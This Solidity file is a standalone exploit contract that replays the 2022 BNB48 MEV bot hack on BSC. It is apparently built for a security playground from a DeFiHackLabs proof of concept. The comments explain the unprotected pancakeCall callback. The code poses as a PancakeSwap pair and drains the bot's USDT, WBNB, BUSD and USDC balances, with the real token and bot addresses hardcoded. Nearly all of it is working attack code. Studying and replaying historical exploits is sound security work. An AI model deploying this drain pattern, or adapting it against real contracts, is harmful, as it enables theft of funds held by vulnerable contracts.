// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2022-09-BNB48MEVBot).
//
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry test contract
// (`ContractTest`): there is no standalone exploit contract — the attack IS the
// test harness, because the bug requires the attacker contract to masquerade as
// a PancakeSwap pair by exposing `token0()` / `token1()` / `swap()` to the bot.
// This contract is a faithful, self-contained copy of that inline attack so the
// playground can deploy it and record `run()`. Logic and constants are copied
// verbatim from test/BNB48MEVBot_exp.sol.
//
// Root cause: the BNB48 MEV bot's `pancakeCall` (the PancakeSwap V2 flash-swap
// callback) has NO access control on `msg.sender`, reads the token to move from
// `msg.sender.token0()`, the amount from `amount0`, and the recipient from the
// caller-supplied `data`. By calling it directly with our own contract as the
// fake "pair", we make the bot transfer its entire balance of each token to us,
// one `pancakeCall` per token. No flash loan, no capital — just four open calls.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
}

interface IMEVBot {
    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

contract BNB48MEVBotDrain {
    // BSC token constants — copied verbatim from the Foundry test.
    address constant USDT = 0x55d398326f99059fF775485246999027B3197955;
    address constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address constant BUSD = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;
    address constant USDC = 0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d;

    // The vulnerable BNB48 MEV bot (unverified on-chain).
    address constant BOT = 0x64dD59D6C7f09dc05B472ce5CB961b6E10106E1d;

    IMEVBot private constant bot = IMEVBot(BOT);

    // The bot reads the "pair" token / calls `swap` on `msg.sender`. We masquerade
    // as the pair by exposing these mutable getters + a no-op swap(), exactly like
    // the Foundry test's ContractTest.
    address public _token0;
    address public _token1;

    function token0() public view returns (address) {
        return _token0;
    }

    function token1() public view returns (address) {
        return _token1;
    }

    // No-op stub — the bot calls `swap(0, 0, msg.sender, "")` as its "repay"/continue
    // leg; in a real flash swap this is where arbitrage repayment happens, but the
    // bot's logic makes it a harmless callback into us.
    function swap(uint256, uint256, address, bytes calldata) public {
        // intentionally empty
    }

    // The attack — drain each token the bot holds, one pancakeCall per token.
    function run() public {
        // The recipient is this contract (decoded from `data`'s first 32-byte word,
        // which is the left-padded address of address(this)). Profit stays in-contract
        // and is scored via profitReceiver: "exploit".
        bytes memory data = abi.encodePacked(bytes12(0), bytes20(address(this)), bytes32(0), bytes32(0));

        // 1) USDT
        uint256 usdtAmount = IERC20(USDT).balanceOf(BOT);
        (_token0, _token1) = (USDT, USDT);
        bot.pancakeCall(address(this), usdtAmount, 0, data);

        // 2) WBNB
        uint256 wbnbAmount = IERC20(WBNB).balanceOf(BOT);
        (_token0, _token1) = (WBNB, WBNB);
        bot.pancakeCall(address(this), wbnbAmount, 0, data);

        // 3) BUSD
        uint256 busdAmount = IERC20(BUSD).balanceOf(BOT);
        (_token0, _token1) = (BUSD, BUSD);
        bot.pancakeCall(address(this), busdAmount, 0, data);

        // 4) USDC
        uint256 usdcAmount = IERC20(USDC).balanceOf(BOT);
        (_token0, _token1) = (USDC, USDC);
        bot.pancakeCall(address(this), usdcAmount, 0, data);
    }
}
